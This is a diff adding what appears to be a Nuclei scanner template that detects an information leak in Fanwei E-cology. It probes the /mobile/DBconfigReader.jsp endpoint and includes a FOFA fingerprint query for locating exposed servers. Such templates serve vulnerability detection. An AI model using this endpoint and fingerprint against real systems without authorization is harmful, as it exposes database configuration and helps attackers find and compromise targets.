@@ -1,0 +1,27 @@
+id: fanwei-e-cology-dbconfigreader-info-leak
+
+info:
+  name: Fanwei E-cology Info Leak
+  author: zp857
+  severity: high
+  reference: https://moresec.yuque.com/iixlqz/wnv3e6/muc8pk
+  tags: fanwei-e-cology,leak
+  metadata:
+    fofa-query: 'body="泛微协同" || body="wui/index.html" || header="ecology_JSessionId"'
+
+requests:
+  - raw:
+      - |
+        GET /mobile/DBconfigReader.jsp HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: header
+        words:
+          - "ecology_JSessionId"
